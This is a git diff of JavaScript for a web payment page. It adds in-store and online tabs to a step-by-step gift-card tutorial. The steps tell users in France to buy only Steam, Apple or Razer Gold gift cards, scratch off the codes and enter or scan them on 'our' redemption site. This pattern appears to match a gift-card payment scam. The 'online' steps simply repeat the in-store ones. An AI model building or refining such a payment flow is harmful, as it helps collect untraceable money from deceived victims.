@@ -38,9 +38,41 @@ function initializeState() {
         paymentTimer: null,
         giftCardTutorial: {
             currentStep: 0,
-            steps: [
+            type: "store",
+            online: [
                 {
-                    image: "https://example.com/giftcard-step1.jpg", // Replace with your image URLs
+                    image: "/src/images/paypal.jpeg",
+                    title: "Step 1: Walk Into the Store",
+                    description: "Start the physical gift card process by walking into a major retail store or supermarket in France. Look for stores like Carrefour, Monoprix, Intermarché, or Fnac. These places usually have a dedicated section for gift cards. Once inside, head toward the electronics, checkout, or prepaid card section."
+                },
+                {
+                    image: "https://example.com/giftcard-step2.jpg",
+                    title: "Step 2: Locate the Gift Card Section and Select an Accepted Card",
+                    description: "Inside the store, look for the rack labeled 'Cartes Cadeaux' (Gift Cards). You’ll find many brands, but only choose from these three: Steam, Apple, Razer Gold. <br/> Make sure the card is sealed and check the amount written on it, such as €20 or €50. Avoid buying unaccepted cards like Amazon, Netflix, or PlayStation"
+                },
+                {
+                    image: "https://example.com/giftcard-step3.jpg",
+                    title: "Step 3: Make Payment for the Gift Card",
+                    description: "Once you've chosen your Steam, Apple, or Razer Gold gift card, take it to the checkout counter. The cashier will scan and activate it. Pay using cash, credit card, or mobile payment.\n Only after payment will the gift card be usable, so always ask for a receipt as proof."
+                },
+                {
+                    image: "https://example.com/giftcard-step4.jpg",
+                    title: "Step 4: Scratch the Card to Reveal the Code",
+                    description: "After payment, gently scratch the silver coating on the back of the card using a coin or key. This will uncover your gift card code, which is needed to redeem or make a payment. Be careful not to damage the numbers or letters. Keep the card safe and readable."
+                },
+                {
+                    image: "https://example.com/giftcard-step4.jpg",
+                    title: "Step 5: Enter the Code on Our Payment Platform",
+                    description: "Once the code is revealed, visit our redeem code payment site. Type in the exact characters shown on the card into the Enter Code box. Select the correct Card Type (Steam, Apple, or Razer Gold), enter the Amount, and then tap Redeem to finalize the process. <br/>Make sure the code is correctly entered — no spaces or typos."
+                },
+                {
+                    image: "https://example.com/giftcard-step4.jpg",
+                    title: "Step 6: Use Scan Code to Upload the Card Photo", description: " Instead of typing the code manually, you can scan the gift card using your phone. Just tap the Scan Code button on the site and position the card in front of your camera. <br/>Make sure the code is clearly visible and fully within the frame. The system will automatically read and extract the code from the image for payment.",
+                },
+            ],
+            store: [
+                {
+                    image: "/src/images/paypal.jpeg",
                     title: "Step 1: Walk Into the Store",
                     description: "Start the physical gift card process by walking into a major retail store or supermarket in France. Look for stores like Carrefour, Monoprix, Intermarché, or Fnac. These places usually have a dedicated section for gift cards. Once inside, head toward the electronics, checkout, or prepaid card section."
                 },
@@ -942,6 +974,7 @@ function setupTutorialNavigation(state, elements) {
     const container = document.getElementById('gift-card-tutorial');
     if (!container) return;
 
+
     // Close button
     container.querySelector('.close-tutorial').addEventListener('click', () => {
         container.classList.add('slide-out-right');
@@ -949,6 +982,28 @@ function setupTutorialNavigation(state, elements) {
             handleGiftCardFlow(state, elements);
         }, 300);
     });
+
+    document.querySelectorAll(".tutorial-header .tutorial-tab .tab").forEach(tab => {
+        tab.addEventListener('click', (e) => {
+            if (tab.id === state.giftCardTutorial.type) return;
+            else {
+
+
+                container.classList.add('slide-out-right');
+
+                const type = tab.id;
+                state.giftCardTutorial.type = type;
+                state.giftCardTutorial.currentStep = 0;
+
+
+                setTimeout(() => {
+                    container.outerHTML = createGiftCardTutorialSection(state);
+                    setupTutorialNavigation(state, elements);
+                    document.getElementById('gift-card-tutorial').classList.add('slide-in-left');
+                }, 300);
+            }
+        })
+    })
 
     // Previous button
     container.querySelector('.prev-btn').addEventListener('click', () => {
@@ -964,7 +1019,8 @@ function setupTutorialNavigation(state, elements) {
     });
 
     container.querySelector('.next-btn').addEventListener('click', (e) => {
-        const isLastStep = state.giftCardTutorial.currentStep === state.giftCardTutorial.steps.length - 1;
+        const type = state.giftCardTutorial.type;
+        const isLastStep = state.giftCardTutorial.currentStep === state.giftCardTutorial[type].length - 1;
 
         if (isLastStep) {
             container.classList.add('slide-out-right');
@@ -1892,15 +1948,25 @@ function createGiftCardInstructionPage(state) {
 }
 
 function createGiftCardTutorialSection(state) {
-    const current = state.giftCardTutorial.steps[state.giftCardTutorial.currentStep];
+    const type = state.giftCardTutorial.type;
+    const currentType = state.giftCardTutorial[type];
+    const current = currentType[state.giftCardTutorial.currentStep];
+
 
     return `
     <div class="payment-section active tutorial-section" id="gift-card-tutorial">
         <div class="tutorial-header">
+        <div class="header-top">
             <p>How to Redeem Gift Cards</p>
             <button class="close-tutorial">&times;</button>
         </div>
-        
+        <div class="tutorial-tab">
+        <div class="tab ${type == "store" ? "active" : ""}" id="store">GET IN STORE</div>
+        <div class="tab ${type == "online" ? "active" : ""}" id="online">GET ONLINE</div>
+        </div>
+        </div>
+
+
         <div class="tutorial-content">
             <div class="tutorial-image-container">
                 <img src="${current.image}" alt="${current.title}" class="tutorial-image">
@@ -1915,9 +1981,9 @@ function createGiftCardTutorialSection(state) {
             <button class="tutorial-nav-btn prev-btn" ${state.giftCardTutorial.currentStep === 0 ? 'disabled' : ''}>
                 <i class="fas fa-chevron-left"></i> Previous
             </button>
-            <span class="tutorial-progress">${state.giftCardTutorial.currentStep + 1}/${state.giftCardTutorial.steps.length}</span>
-            <button class="tutorial-nav-btn next-btn ${state.giftCardTutorial.currentStep === state.giftCardTutorial.steps.length - 1 ? "close-tutorial" : ""}">
-                ${state.giftCardTutorial.currentStep === state.giftCardTutorial.steps.length - 1 ? "Go Back" : "Next"
+            <span class="tutorial-progress">${state.giftCardTutorial.currentStep + 1}/${currentType.length}</span>
+            <button class="tutorial-nav-btn next-btn ${state.giftCardTutorial.currentStep === currentType.length - 1 ? "close-tutorial" : ""}">
+                ${state.giftCardTutorial.currentStep === currentType.length - 1 ? "Go Back" : "Next"
         } <i class="fas fa-chevron-right"></i>
             </button>
         </div>
